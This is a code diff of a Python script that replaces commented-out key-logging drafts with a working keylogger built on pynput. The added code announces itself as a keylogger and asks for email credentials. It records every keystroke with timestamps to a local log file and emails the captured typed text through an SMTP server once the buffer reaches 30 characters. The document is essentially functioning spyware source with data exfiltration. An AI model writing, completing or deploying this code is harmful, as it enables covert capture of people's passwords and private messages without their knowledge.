@@ -1,141 +1,81 @@
-# import pynput
-# import os
-# import time
-# from pynput.keyboard import Key, Listener, HotKey
-
-# log_file_elems = os.environ.get( 'pylogger_file',
-# 	            				           os.path.expanduser('~/elems.log')
-#                       			   )
-
-# log_file_time = os.environ.get( 'pylogger_file',
-# 	            				           os.path.expanduser('~/time.log')
-#                      			    )
-
-# keys = []
-
-# def press_elem(event):
-#     print('{}\n'.format(event))
-#     print(type(event))
-#     check = str(event).find('Key')
-#     if check != -1:
-# 	  	  event = str(event).replace('Key.', '')
-#     keys.append(event)
-#     with open(log_file_time, 'a+') as ft:
-#         ft.write('{}\n'.format(time.time()))
-#     with open(log_file_elems, 'a+') as f:
-#         f.write('{}\n'.format(event))
-
-
-# def release_elem(event):
-#     for el in keys:
-#         print(el, end=' ')
-#     print('')
-#     print('{}\n'.format(event))
-
-# def aux_func(f):
-#     return lambda k: f(listener.canonical(hotkey(k)))
-
-
-# def stop_listen():
-#     exit()
-
-
-# # with GlobalHotKeys({'<ctrl>+<k>' : stop_listen}) as act:
-# #     act.join()
-
-# if __name__ == '__main__':
-#     hotkey = HotKey(HotKey.parse('<ctrl>+k'), stop_listen)
-
-#     with open(log_file_time, 'a+') as ft:
-# 	  	  ft.write('{}\n'.format(time.ctime()))
-#     with open(log_file_elems, 'a+') as f:
-#         f.write('{}\n'.format(time.ctime()))
-#     with Listener(on_press = press_elem, on_release = aux_func(hotkey.release_elem)) as listener:
-# 	  	  listener.join()
-
-# import pynput
-# from pynput.keyboard import Key, Listener, HotKey
-
-# def on_activate():
-#     Listener.stop()
-
-# def for_canonical(f):
-#     return lambda k: f(l.canonical(k))
-
-# is_ctrl = False
-
-
-# def press_el(event):
-#     print(event)
-
-# def release(event):
-#     global is_ctrl
-#     if event == Key.ctrl:
-#         is_ctrl = True
-#     if event != Key.ctrl and event != Key.f5:
-#         is_ctrl = False
-#     if event == Key.f5 and is_ctrl:
-#         return False
-
-# # определение горячей клавиши
-# hotkey = HotKey(
-#     HotKey.parse('<ctrl>+<alt>+h'),
-#     on_activate)
-
-
-# if __name__ == '__main__':
-#     with Listener(on_press=press_el, on_release = release) as l:
-#         l.join()
-#     # with Listener(
-#     #         on_press = for_canonical(hotkey.release), on_release = for_canonical(hotkey.release)) as h:
-#     #     h.join()
-
-
-import pynput
-import os
 import time
+import getpass
+import smtplib
 from pynput.keyboard import Key, Listener
 
-log_file_elems = os.environ.get( 'pylogger_file',
-	            				           os.path.expanduser('~/file.log')
-                      			   )
+print('\n\n')
+print('Запуск keylogger-a...\n\n')
 
-# log_file_time = os.environ.get( 'pylogger_file',
-	            				        #    os.path.expanduser('~/time.log')
-                     			    # )
+# Ввод логина и пароля электронной почты, на которую
+# будут отправляться письма
+email = input('Введите email: ')
+password = getpass.getpass(prompt='Введите пароль: ')
+server = smtplib.SMTP_SSL('smtp.list.ru', 465)
+server.login(email, password)
 
-keys = []
+# Определение глобальных переменных
+cur_log = ''
+word = ''
+email_char_limit = 30
 is_ctrl = False
+path = 'e:/file.log'
 
+
+# Регистрация клавиши при нажатии
 def press_elem(event):
+  global email
+  global cur_log
+  global word
+  global email_char_limit
+  global is_ctrl
+  if event == Key.ctrl_l:
+    is_ctrl = True
+  if event != Key.ctrl_l and event != Key.f5:
+    is_ctrl = False
+  if event == Key.f5 and is_ctrl:
+    return False
+  if event == Key.space or event == Key.enter:
+    word += ' '
+    cur_log += word
+    word = ''
+    if len(cur_log) >= email_char_limit:
+      send_log()
+      cur_log = ''
+  elif event == Key.shift_l or event == Key.shift_r:
+    return
+  elif event == Key.backspace:
+    word = word[:-1]
+  else:
     event = str(event)
     check = event.find('Key')
     if check != -1:
-	  	  event = event.replace('Key.', '')
-    keys.append(event)
-    # with open(log_file_time, 'a+') as ft:
-    #     ft.write('{}\n'.format(time.time()))
-    with open(log_file_elems, 'a+') as f:
-        f.write('{}-'.format(event))
-        f.write('{}\n'.format(time.time()))
+      event = event.replace('Key.', '')
+      word += event
+    else:
+      word += event[1:-1]
+
+  
+  event = str(event)
+  check = event.find('Key')
+  if check != -1:
+    event = event.replace('Key.', '')
+  with open(path, 'a+') as f:
+    f.write('{}-'.format(event))
+    f.write('{}:'.format(time.time()))
     
 
-
+# Регистрация клавиши после нажатия
 def release_elem(event):
-    # for el in keys:
-    #     print(el, end=' ')
-    # print('')
-    global is_ctrl
-    if event == Key.ctrl:
-        is_ctrl = True
-    if event != Key.ctrl and event != Key.f5:
-        is_ctrl = False
-    if event == Key.f5 and is_ctrl:
-        return False    
+  with open(path, 'a+') as f:
+    f.write('{}\n'.format(time.time()))
 
+
+# Отправка данных на электронную почту
+def send_log():
+  server.sendmail(email, email, cur_log)
 
 if __name__ == '__main__':
-    with open(log_file_elems, 'a+') as f:
-        f.write('{}\n'.format(time.ctime()))
-    with Listener(on_press = press_elem, on_release = release_elem) as listener:
-	  	  listener.join()
+  with open(path, 'a+') as f:
+    f.write('{}\n'.format(time.ctime()))
+  with Listener(on_press = press_elem, on_release = release_elem) as listener:
+    listener.join()
